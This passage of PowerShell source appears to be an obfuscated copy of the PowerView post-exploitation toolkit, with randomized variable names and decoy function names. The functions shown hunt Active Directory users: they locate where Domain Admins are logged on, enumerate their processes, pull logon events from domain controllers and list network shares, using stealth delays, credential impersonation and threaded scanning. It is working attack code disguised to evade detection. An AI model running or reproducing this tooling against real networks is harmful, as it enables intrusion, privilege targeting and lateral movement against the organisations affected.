                    $NchVnIsg99 = reenforce -FRrsCtDf99 $sKWGHAjO99
                    ForEach ($cjOfKqgp99 in $NchVnIsg99) {
                        $pgSynGHL99 = $cjOfKqgp99.UserName
                        $CName = $cjOfKqgp99.CName
                        if ($CName -and $CName.StartsWith('\\')) {
                            $CName = $CName.TrimStart('\')
                        }
                        if (($pgSynGHL99) -and ($pgSynGHL99.Trim() -ne '') -and ($pgSynGHL99 -notmatch $ZVVXqHOv99) -and ($pgSynGHL99 -notmatch '\$$')) {
                            if ( (-not $TIUIlEVH99) -or ($TIUIlEVH99 -contains $pgSynGHL99)) {
                                $DUsweYYn99 = New-Object PSObject
                                $DUsweYYn99 | Add-Member Noteproperty 'UserDomain' $Null
                                $DUsweYYn99 | Add-Member Noteproperty 'UserName' $pgSynGHL99
                                $DUsweYYn99 | Add-Member Noteproperty 'ComputerName' $sKWGHAjO99
                                $DUsweYYn99 | Add-Member Noteproperty 'SessionFrom' $CName
                                try {
                                    $shAstaBG99 = [System.Net.Dns]::GetHostEntry($CName) | Select-Object -ExpandProperty HostName
                                    $DUsweYYn99 | Add-Member NoteProperty 'SessionFromName' $shAstaBG99
                                }
                                catch {
                                    $DUsweYYn99 | Add-Member NoteProperty 'SessionFromName' $Null
                                }
                                if ($tTmpBjDH99) {
                                    $Admin = (patinas -FRrsCtDf99 $CName).IsAdmin
                                    $DUsweYYn99 | Add-Member Noteproperty 'LocalAdmin' $Admin.IsAdmin
                                }
                                else {
                                    $DUsweYYn99 | Add-Member Noteproperty 'LocalAdmin' $Null
                                }
                                $DUsweYYn99.PSObject.TypeNames.Insert(0, 'PowerView.UserLocation')
                                $DUsweYYn99
                            }
                        }
                    }
                    if (-not $BCRKPOeL99) {
                        $ENpYEXnu99 = tramming -FRrsCtDf99 $sKWGHAjO99
                        ForEach ($User in $ENpYEXnu99) {
                            $pgSynGHL99 = $User.UserName
                            $NzTnTiPA99 = $User.LogonDomain
                            if (($pgSynGHL99) -and ($pgSynGHL99.trim() -ne '')) {
                                if ( (-not $TIUIlEVH99) -or ($TIUIlEVH99 -contains $pgSynGHL99) -and ($pgSynGHL99 -notmatch '\$$')) {
                                    $uHbKpIte99 = @(asked -FRrsCtDf99 $sKWGHAjO99)[0].IPAddress
                                    $DUsweYYn99 = New-Object PSObject
                                    $DUsweYYn99 | Add-Member Noteproperty 'UserDomain' $NzTnTiPA99
                                    $DUsweYYn99 | Add-Member Noteproperty 'UserName' $pgSynGHL99
                                    $DUsweYYn99 | Add-Member Noteproperty 'ComputerName' $sKWGHAjO99
                                    $DUsweYYn99 | Add-Member Noteproperty 'IPAddress' $uHbKpIte99
                                    $DUsweYYn99 | Add-Member Noteproperty 'SessionFrom' $Null
                                    $DUsweYYn99 | Add-Member Noteproperty 'SessionFromName' $Null
                                    if ($tTmpBjDH99) {
                                        $Admin = patinas -FRrsCtDf99 $sKWGHAjO99
                                        $DUsweYYn99 | Add-Member Noteproperty 'LocalAdmin' $Admin.IsAdmin
                                    }
                                    else {
                                        $DUsweYYn99 | Add-Member Noteproperty 'LocalAdmin' $Null
                                    }
                                    $DUsweYYn99.PSObject.TypeNames.Insert(0, 'PowerView.UserLocation')
                                    $DUsweYYn99
                                }
                            }
                        }
                    }
                }
            }
            if ($TtWrEMPZ99) {
                lithe
            }
        }
        $nGIhjdzZ99 = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $nGIhjdzZ99 = departs -fxunRYJT99 $fxunRYJT99
            }
            else {
                $nGIhjdzZ99 = departs -fxunRYJT99 $fxunRYJT99 -Quiet
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
            Write-Verbose "[Rich] Total number of hosts: $($LhPthbPt99.count)"
            Write-Verbose "[Rich] Delay: $Delay, Jitter: $WfsvHBIT99"
            $mOnaorlA99 = 0
            $zQKolgzb99 = New-Object System.Random
            ForEach ($sKWGHAjO99 in $LhPthbPt99) {
                $mOnaorlA99 = $mOnaorlA99 + 1
                Start-Sleep -Seconds $zQKolgzb99.Next((1-$WfsvHBIT99)*$Delay, (1+$WfsvHBIT99)*$Delay)
                Write-Verbose "[Rich] Enumerating server $aJJGHudX99 ($mOnaorlA99 of $($LhPthbPt99.Count))"
                Invoke-Command -qufpOQjV99 $xMDBlffj99 -ArgumentList $sKWGHAjO99, $TIUIlEVH99, $ZVVXqHOv99, $BCRKPOeL99, $nGIhjdzZ99
                if ($kTrwYNCb99 -and $YjZHzKFA99) {
                    Write-Verbose "[Rich] Target user found, returning early"
                    return
                }
            }
        }
        else {
            Write-Verbose "[Rich] Using threading with threads: $OVPWEKQH99"
            Write-Verbose "[Rich] TargetComputers length: $($LhPthbPt99.Length)"
            $fjioLOdg99 = @{
                'TargetUsers' = $TIUIlEVH99
                'CurrentUser' = $ZVVXqHOv99
                'Stealth' = $BCRKPOeL99
                'TokenHandle' = $nGIhjdzZ99
            }
            liable -FRrsCtDf99 $LhPthbPt99 -qufpOQjV99 $xMDBlffj99 -KaKNBSkt99 $fjioLOdg99 -OVPWEKQH99 $OVPWEKQH99
        }
    }
    END {
        if ($nGIhjdzZ99) {
            lithe -TtWrEMPZ99 $nGIhjdzZ99
        }
    }
}
function acrobats {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUsePSCredentialType', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [OutputType('PowerView.UserProcess')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $FRrsCtDf99,
        [ValidateNotNullOrEmpty()]
        [String]
        $UtXBFQsM99,
        [ValidateNotNullOrEmpty()]
        [String]
        $dZsWzroh99,
        [ValidateNotNullOrEmpty()]
        [String]
        $aXAjpBZF99,
        [ValidateNotNullOrEmpty()]
        [String]
        $ylCWjnDC99,
        [Alias('Unconstrained')]
        [Switch]
        $gLTiFMlP99,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $hmaWUxwb99,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $dxKxxCOP99,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $gnqgCtNx99,
        [Parameter(ParameterSetName = 'TargetProcess')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $GhszNNhp99,
        [Parameter(ParameterSetName = 'TargetUser')]
        [Parameter(ParameterSetName = 'UserIdentity')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $DGKWisJq99,
        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        $NzTnTiPA99,
        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        $rjXhRXOy99,
        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        $uMeRoqnN99,
        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        $ixnbeNsM99 = 'Domain Admins',
        [Parameter(ParameterSetName = 'TargetUser')]
        [Alias('AdminCount')]
        [Switch]
        $CbRuRoHr99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YBAlGqrU99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $daZTeEQR99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $JFYciBwT99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $qaKJUqzZ99,
        [Switch]
        $mIpZvziV99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $YjZHzKFA99,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $WfsvHBIT99 = .3,
        [Int]
        [ValidateRange(1, 100)]
        $OVPWEKQH99 = 20
    )
    BEGIN {
        $AiVkGjhl99 = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['Domain']) { $AiVkGjhl99['Domain'] = $UtXBFQsM99 }
        if ($PSBoundParameters['ComputerDomain']) { $AiVkGjhl99['Domain'] = $dZsWzroh99 }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $AiVkGjhl99['LDAPFilter'] = $aXAjpBZF99 }
        if ($PSBoundParameters['ComputerSearchBase']) { $AiVkGjhl99['SearchBase'] = $ylCWjnDC99 }
        if ($PSBoundParameters['Unconstrained']) { $AiVkGjhl99['Unconstrained'] = $ynilECNu99 }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $AiVkGjhl99['OperatingSystem'] = $fvZEnbGC99 }
        if ($PSBoundParameters['ComputerServicePack']) { $AiVkGjhl99['ServicePack'] = $fGspowYC99 }
        if ($PSBoundParameters['ComputerSiteName']) { $AiVkGjhl99['SiteName'] = $DgPmuXLw99 }
        if ($PSBoundParameters['Server']) { $AiVkGjhl99['Server'] = $YBAlGqrU99 }
        if ($PSBoundParameters['SearchScope']) { $AiVkGjhl99['SearchScope'] = $daZTeEQR99 }
        if ($PSBoundParameters['ResultPageSize']) { $AiVkGjhl99['ResultPageSize'] = $JFYciBwT99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $AiVkGjhl99['ServerTimeLimit'] = $qaKJUqzZ99 }
        if ($PSBoundParameters['Tombstone']) { $AiVkGjhl99['Tombstone'] = $mIpZvziV99 }
        if ($PSBoundParameters['Credential']) { $AiVkGjhl99['Credential'] = $fxunRYJT99 }
        $obYNFcTp99 = @{
            'Properties' = 'samaccountname'
        }
        if ($PSBoundParameters['UserIdentity']) { $obYNFcTp99['Identity'] = $DGKWisJq99 }
        if ($PSBoundParameters['Domain']) { $obYNFcTp99['Domain'] = $UtXBFQsM99 }
        if ($PSBoundParameters['UserDomain']) { $obYNFcTp99['Domain'] = $NzTnTiPA99 }
        if ($PSBoundParameters['UserLDAPFilter']) { $obYNFcTp99['LDAPFilter'] = $rjXhRXOy99 }
        if ($PSBoundParameters['UserSearchBase']) { $obYNFcTp99['SearchBase'] = $uMeRoqnN99 }
        if ($PSBoundParameters['UserAdminCount']) { $obYNFcTp99['AdminCount'] = $CbRuRoHr99 }
        if ($PSBoundParameters['Server']) { $obYNFcTp99['Server'] = $YBAlGqrU99 }
        if ($PSBoundParameters['SearchScope']) { $obYNFcTp99['SearchScope'] = $daZTeEQR99 }
        if ($PSBoundParameters['ResultPageSize']) { $obYNFcTp99['ResultPageSize'] = $JFYciBwT99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $obYNFcTp99['ServerTimeLimit'] = $qaKJUqzZ99 }
        if ($PSBoundParameters['Tombstone']) { $obYNFcTp99['Tombstone'] = $mIpZvziV99 }
        if ($PSBoundParameters['Credential']) { $obYNFcTp99['Credential'] = $fxunRYJT99 }
        if ($PSBoundParameters['ComputerName']) {
            $LhPthbPt99 = $FRrsCtDf99
        }
        else {
            Write-Verbose '[acrobats] Querying computers in the domain'
            $LhPthbPt99 = sensationalist @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[acrobats] TargetComputers length: $($LhPthbPt99.Length)"
        if ($LhPthbPt99.Length -eq 0) {
            throw '[acrobats] No hosts found to enumerate'
        }
        if ($PSBoundParameters['ProcessName']) {
            $xTBNIkVf99 = @()
            ForEach ($T in $GhszNNhp99) {
                $xTBNIkVf99 += $T.Split(',')
            }
            if ($xTBNIkVf99 -isnot [System.Array]) {
                $xTBNIkVf99 = [String[]] @($xTBNIkVf99)
            }
        }
        elseif ($PSBoundParameters['UserIdentity'] -or $PSBoundParameters['UserLDAPFilter'] -or $PSBoundParameters['UserSearchBase'] -or $PSBoundParameters['UserAdminCount'] -or $PSBoundParameters['UserAllowDelegation']) {
            $TIUIlEVH99 = threatened @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
        }
        else {
            $IHABlwZD99 = @{
                'Identity' = $ixnbeNsM99
                'Recurse' = $True
            }
            if ($PSBoundParameters['UserDomain']) { $IHABlwZD99['Domain'] = $NzTnTiPA99 }
            if ($PSBoundParameters['UserSearchBase']) { $IHABlwZD99['SearchBase'] = $uMeRoqnN99 }
            if ($PSBoundParameters['Server']) { $IHABlwZD99['Server'] = $YBAlGqrU99 }
            if ($PSBoundParameters['SearchScope']) { $IHABlwZD99['SearchScope'] = $daZTeEQR99 }
            if ($PSBoundParameters['ResultPageSize']) { $IHABlwZD99['ResultPageSize'] = $JFYciBwT99 }
            if ($PSBoundParameters['ServerTimeLimit']) { $IHABlwZD99['ServerTimeLimit'] = $qaKJUqzZ99 }
            if ($PSBoundParameters['Tombstone']) { $IHABlwZD99['Tombstone'] = $mIpZvziV99 }
            if ($PSBoundParameters['Credential']) { $IHABlwZD99['Credential'] = $fxunRYJT99 }
            $IHABlwZD99
            $TIUIlEVH99 = monkeying @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
        }
        $xMDBlffj99 = {
            Param($FRrsCtDf99, $GhszNNhp99, $TIUIlEVH99, $fxunRYJT99)
            ForEach ($sKWGHAjO99 in $FRrsCtDf99) {
                $Up = Test-Connection -Count 1 -Quiet -FRrsCtDf99 $sKWGHAjO99
                if ($Up) {
                    if ($fxunRYJT99) {
                        $LxpXbgOg99 = keels -fxunRYJT99 $fxunRYJT99 -FRrsCtDf99 $sKWGHAjO99 -ErrorAction SilentlyContinue
                    }
                    else {
                        $LxpXbgOg99 = keels -FRrsCtDf99 $sKWGHAjO99 -ErrorAction SilentlyContinue
                    }
                    ForEach ($biykNbRr99 in $LxpXbgOg99) {
                        if ($GhszNNhp99) {
                            if ($GhszNNhp99 -Contains $biykNbRr99.ProcessName) {
                                $biykNbRr99
                            }
                        }
                        elseif ($TIUIlEVH99 -Contains $biykNbRr99.User) {
                            $biykNbRr99
                        }
                    }
                }
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
            Write-Verbose "[acrobats] Total number of hosts: $($LhPthbPt99.count)"
            Write-Verbose "[acrobats] Delay: $Delay, Jitter: $WfsvHBIT99"
            $mOnaorlA99 = 0
            $zQKolgzb99 = New-Object System.Random
            ForEach ($sKWGHAjO99 in $LhPthbPt99) {
                $mOnaorlA99 = $mOnaorlA99 + 1
                Start-Sleep -Seconds $zQKolgzb99.Next((1-$WfsvHBIT99)*$Delay, (1+$WfsvHBIT99)*$Delay)
                Write-Verbose "[acrobats] Enumerating server $sKWGHAjO99 ($mOnaorlA99 of $($LhPthbPt99.count))"
                $kTrwYNCb99 = Invoke-Command -qufpOQjV99 $xMDBlffj99 -ArgumentList $sKWGHAjO99, $xTBNIkVf99, $TIUIlEVH99, $fxunRYJT99
                $kTrwYNCb99
                if ($kTrwYNCb99 -and $YjZHzKFA99) {
                    Write-Verbose "[acrobats] Target user found, returning early"
                    return
                }
            }
        }
        else {
            Write-Verbose "[acrobats] Using threading with threads: $OVPWEKQH99"
            $fjioLOdg99 = @{
                'ProcessName' = $xTBNIkVf99
                'TargetUsers' = $TIUIlEVH99
                'Credential' = $fxunRYJT99
            }
            liable -FRrsCtDf99 $LhPthbPt99 -qufpOQjV99 $xMDBlffj99 -KaKNBSkt99 $fjioLOdg99 -OVPWEKQH99 $OVPWEKQH99
        }
    }
}
function Epicurean {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUsePSCredentialType', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [OutputType('PowerView.LogonEvent')]
    [OutputType('PowerView.ExplicitCredentialLogon')]
    [CmdletBinding(DefaultParameterSetName = 'Domain')]
    Param(
        [Parameter(ParameterSetName = 'ComputerName', Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('dnshostname', 'HostName', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $FRrsCtDf99,
        [Parameter(ParameterSetName = 'Domain')]
        [ValidateNotNullOrEmpty()]
        [String]
        $UtXBFQsM99,
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $bNYXjnRz99,
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $lagChWau99 = [DateTime]::Now.AddDays(-1),
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $tmNEVEBg99 = [DateTime]::Now,
        [ValidateRange(1, 1000000)]
        [Int]
        $dvqzloWn99 = 5000,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $DGKWisJq99,
        [ValidateNotNullOrEmpty()]
        [String]
        $NzTnTiPA99,
        [ValidateNotNullOrEmpty()]
        [String]
        $rjXhRXOy99,
        [ValidateNotNullOrEmpty()]
        [String]
        $uMeRoqnN99,
        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        $ixnbeNsM99 = 'Domain Admins',
        [Alias('AdminCount')]
        [Switch]
        $CbRuRoHr99,
        [Switch]
        $tTmpBjDH99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YBAlGqrU99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $daZTeEQR99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $JFYciBwT99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $qaKJUqzZ99,
        [Switch]
        $mIpZvziV99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $YjZHzKFA99,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $WfsvHBIT99 = .3,
        [Int]
        [ValidateRange(1, 100)]
        $OVPWEKQH99 = 20
    )
    BEGIN {
        $obYNFcTp99 = @{
            'Properties' = 'samaccountname'
        }
        if ($PSBoundParameters['UserIdentity']) { $obYNFcTp99['Identity'] = $DGKWisJq99 }
        if ($PSBoundParameters['UserDomain']) { $obYNFcTp99['Domain'] = $NzTnTiPA99 }
        if ($PSBoundParameters['UserLDAPFilter']) { $obYNFcTp99['LDAPFilter'] = $rjXhRXOy99 }
        if ($PSBoundParameters['UserSearchBase']) { $obYNFcTp99['SearchBase'] = $uMeRoqnN99 }
        if ($PSBoundParameters['UserAdminCount']) { $obYNFcTp99['AdminCount'] = $CbRuRoHr99 }
        if ($PSBoundParameters['Server']) { $obYNFcTp99['Server'] = $YBAlGqrU99 }
        if ($PSBoundParameters['SearchScope']) { $obYNFcTp99['SearchScope'] = $daZTeEQR99 }
        if ($PSBoundParameters['ResultPageSize']) { $obYNFcTp99['ResultPageSize'] = $JFYciBwT99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $obYNFcTp99['ServerTimeLimit'] = $qaKJUqzZ99 }
        if ($PSBoundParameters['Tombstone']) { $obYNFcTp99['Tombstone'] = $mIpZvziV99 }
        if ($PSBoundParameters['Credential']) { $obYNFcTp99['Credential'] = $fxunRYJT99 }
        if ($PSBoundParameters['UserIdentity'] -or $PSBoundParameters['UserLDAPFilter'] -or $PSBoundParameters['UserSearchBase'] -or $PSBoundParameters['UserAdminCount']) {
            $TIUIlEVH99 = threatened @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
        }
        elseif ($PSBoundParameters['UserGroupIdentity'] -or (-not $PSBoundParameters['Filter'])) {
            $IHABlwZD99 = @{
                'Identity' = $ixnbeNsM99
                'Recurse' = $True
            }
            Write-Verbose "UserGroupIdentity: $ixnbeNsM99"
            if ($PSBoundParameters['UserDomain']) { $IHABlwZD99['Domain'] = $NzTnTiPA99 }
            if ($PSBoundParameters['UserSearchBase']) { $IHABlwZD99['SearchBase'] = $uMeRoqnN99 }
            if ($PSBoundParameters['Server']) { $IHABlwZD99['Server'] = $YBAlGqrU99 }
            if ($PSBoundParameters['SearchScope']) { $IHABlwZD99['SearchScope'] = $daZTeEQR99 }
            if ($PSBoundParameters['ResultPageSize']) { $IHABlwZD99['ResultPageSize'] = $JFYciBwT99 }
            if ($PSBoundParameters['ServerTimeLimit']) { $IHABlwZD99['ServerTimeLimit'] = $qaKJUqzZ99 }
            if ($PSBoundParameters['Tombstone']) { $IHABlwZD99['Tombstone'] = $mIpZvziV99 }
            if ($PSBoundParameters['Credential']) { $IHABlwZD99['Credential'] = $fxunRYJT99 }
            $TIUIlEVH99 = monkeying @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
        }
        if ($PSBoundParameters['ComputerName']) {
            $LhPthbPt99 = $FRrsCtDf99
        }
        else {
            $EDDYLulN99 = @{
                'LDAP' = $True
            }
            if ($PSBoundParameters['Domain']) { $EDDYLulN99['Domain'] = $UtXBFQsM99 }
            if ($PSBoundParameters['Server']) { $EDDYLulN99['Server'] = $YBAlGqrU99 }
            if ($PSBoundParameters['Credential']) { $EDDYLulN99['Credential'] = $fxunRYJT99 }
            Write-Verbose "[Epicurean] Querying for domain controllers in domain: $UtXBFQsM99"
            $LhPthbPt99 = pizzicatos @DCSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        if ($LhPthbPt99 -and ($LhPthbPt99 -isnot [System.Array])) {
            $LhPthbPt99 = @(,$LhPthbPt99)
        }
        Write-Verbose "[Epicurean] TargetComputers length: $($LhPthbPt99.Length)"
        Write-Verbose "[Epicurean] TargetComputers $LhPthbPt99"
        if ($LhPthbPt99.Length -eq 0) {
            throw '[Epicurean] No hosts found to enumerate'
        }
        $xMDBlffj99 = {
            Param($FRrsCtDf99, $lagChWau99, $tmNEVEBg99, $dvqzloWn99, $TIUIlEVH99, $bNYXjnRz99, $fxunRYJT99)
            ForEach ($sKWGHAjO99 in $FRrsCtDf99) {
                $Up = Test-Connection -Count 1 -Quiet -FRrsCtDf99 $sKWGHAjO99
                if ($Up) {
                    $RAkCCqvv99 = @{
                        'ComputerName' = $sKWGHAjO99
                    }
                    if ($lagChWau99) { $RAkCCqvv99['StartTime'] = $lagChWau99 }
                    if ($tmNEVEBg99) { $RAkCCqvv99['EndTime'] = $tmNEVEBg99 }
                    if ($dvqzloWn99) { $RAkCCqvv99['MaxEvents'] = $dvqzloWn99 }
                    if ($fxunRYJT99) { $RAkCCqvv99['Credential'] = $fxunRYJT99 }
                    if ($bNYXjnRz99 -or $TIUIlEVH99) {
                        if ($TIUIlEVH99) {
                            figures @DomainUserEventArgs | Where-Object {$TIUIlEVH99 -contains $_.TargetUserName}
                        }
                        else {
                            $zRPbJJvj99 = 'or'
                            $bNYXjnRz99.Keys | ForEach-Object {
                                if (($_ -eq 'Op') -or ($_ -eq 'Operator') -or ($_ -eq 'Operation')) {
                                    if (($bNYXjnRz99[$_] -match '&') -or ($bNYXjnRz99[$_] -eq 'and')) {
                                        $zRPbJJvj99 = 'and'
                                    }
                                }
                            }
                            $Keys = $bNYXjnRz99.Keys | Where-Object {($_ -ne 'Op') -and ($_ -ne 'Operator') -and ($_ -ne 'Operation')}
                            figures @DomainUserEventArgs | ForEach-Object {
                                if ($zRPbJJvj99 -eq 'or') {
                                    ForEach ($Key in $Keys) {
                                        if ($_."$Key" -match $bNYXjnRz99[$Key]) {
                                            $_
                                        }
                                    }
                                }
                                else {
                                    ForEach ($Key in $Keys) {
                                        if ($_."$Key" -notmatch $bNYXjnRz99[$Key]) {
                                            break
                                        }
                                        $_
                                    }
                                }
                            }
                        }
                    }
                    else {
                        figures @DomainUserEventArgs
                    }
                }
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
            Write-Verbose "[Epicurean] Total number of hosts: $($LhPthbPt99.count)"
            Write-Verbose "[Epicurean] Delay: $Delay, Jitter: $WfsvHBIT99"
            $mOnaorlA99 = 0
            $zQKolgzb99 = New-Object System.Random
            ForEach ($sKWGHAjO99 in $LhPthbPt99) {
                $mOnaorlA99 = $mOnaorlA99 + 1
                Start-Sleep -Seconds $zQKolgzb99.Next((1-$WfsvHBIT99)*$Delay, (1+$WfsvHBIT99)*$Delay)
                Write-Verbose "[Epicurean] Enumerating server $sKWGHAjO99 ($mOnaorlA99 of $($LhPthbPt99.count))"
                $kTrwYNCb99 = Invoke-Command -qufpOQjV99 $xMDBlffj99 -ArgumentList $sKWGHAjO99, $lagChWau99, $tmNEVEBg99, $dvqzloWn99, $TIUIlEVH99, $bNYXjnRz99, $fxunRYJT99
                $kTrwYNCb99
                if ($kTrwYNCb99 -and $YjZHzKFA99) {
                    Write-Verbose "[Epicurean] Target user found, returning early"
                    return
                }
            }
        }
        else {
            Write-Verbose "[Epicurean] Using threading with threads: $OVPWEKQH99"
            $fjioLOdg99 = @{
                'StartTime' = $lagChWau99
                'EndTime' = $tmNEVEBg99
                'MaxEvents' = $dvqzloWn99
                'TargetUsers' = $TIUIlEVH99
                'Filter' = $bNYXjnRz99
                'Credential' = $fxunRYJT99
            }
            liable -FRrsCtDf99 $LhPthbPt99 -qufpOQjV99 $xMDBlffj99 -KaKNBSkt99 $fjioLOdg99 -OVPWEKQH99 $OVPWEKQH99
        }
    }
}
function exiles {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ShareInfo')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $FRrsCtDf99,
        [ValidateNotNullOrEmpty()]
        [Alias('Domain')]
        [String]
        $dZsWzroh99,
        [ValidateNotNullOrEmpty()]
        [String]
        $aXAjpBZF99,
        [ValidateNotNullOrEmpty()]
        [String]
        $ylCWjnDC99,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $hmaWUxwb99,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $dxKxxCOP99,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $gnqgCtNx99,
        [Alias('CheckAccess')]
        [Switch]
        $QUPXZQIY99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YBAlGqrU99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $daZTeEQR99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $JFYciBwT99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $qaKJUqzZ99,
        [Switch]
        $mIpZvziV99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $WfsvHBIT99 = .3,
        [Int]
        [ValidateRange(1, 100)]
        $OVPWEKQH99 = 20
    )
    BEGIN {
        $AiVkGjhl99 = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['ComputerDomain']) { $AiVkGjhl99['Domain'] = $dZsWzroh99 }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $AiVkGjhl99['LDAPFilter'] = $aXAjpBZF99 }
        if ($PSBoundParameters['ComputerSearchBase']) { $AiVkGjhl99['SearchBase'] = $ylCWjnDC99 }
        if ($PSBoundParameters['Unconstrained']) { $AiVkGjhl99['Unconstrained'] = $ynilECNu99 }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $AiVkGjhl99['OperatingSystem'] = $fvZEnbGC99 }
        if ($PSBoundParameters['ComputerServicePack']) { $AiVkGjhl99['ServicePack'] = $fGspowYC99 }
        if ($PSBoundParameters['ComputerSiteName']) { $AiVkGjhl99['SiteName'] = $DgPmuXLw99 }
        if ($PSBoundParameters['Server']) { $AiVkGjhl99['Server'] = $YBAlGqrU99 }
        if ($PSBoundParameters['SearchScope']) { $AiVkGjhl99['SearchScope'] = $daZTeEQR99 }
        if ($PSBoundParameters['ResultPageSize']) { $AiVkGjhl99['ResultPageSize'] = $JFYciBwT99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $AiVkGjhl99['ServerTimeLimit'] = $qaKJUqzZ99 }
        if ($PSBoundParameters['Tombstone']) { $AiVkGjhl99['Tombstone'] = $mIpZvziV99 }
        if ($PSBoundParameters['Credential']) { $AiVkGjhl99['Credential'] = $fxunRYJT99 }
        if ($PSBoundParameters['ComputerName']) {
            $LhPthbPt99 = $FRrsCtDf99
        }
        else {
            Write-Verbose '[exiles] Querying computers in the domain'
            $LhPthbPt99 = sensationalist @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[exiles] TargetComputers length: $($LhPthbPt99.Length)"
        if ($LhPthbPt99.Length -eq 0) {
            throw '[exiles] No hosts found to enumerate'
        }
        $xMDBlffj99 = {
            Param($FRrsCtDf99, $QUPXZQIY99, $TtWrEMPZ99)
            if ($TtWrEMPZ99) {
                $Null = departs -TtWrEMPZ99 $TtWrEMPZ99 -Quiet
            }
            ForEach ($sKWGHAjO99 in $FRrsCtDf99) {
                $Up = Test-Connection -Count 1 -Quiet -FRrsCtDf99 $sKWGHAjO99
                if ($Up) {
                    $esdJYgCF99 = practise -FRrsCtDf99 $sKWGHAjO99
                    ForEach ($Share in $esdJYgCF99) {
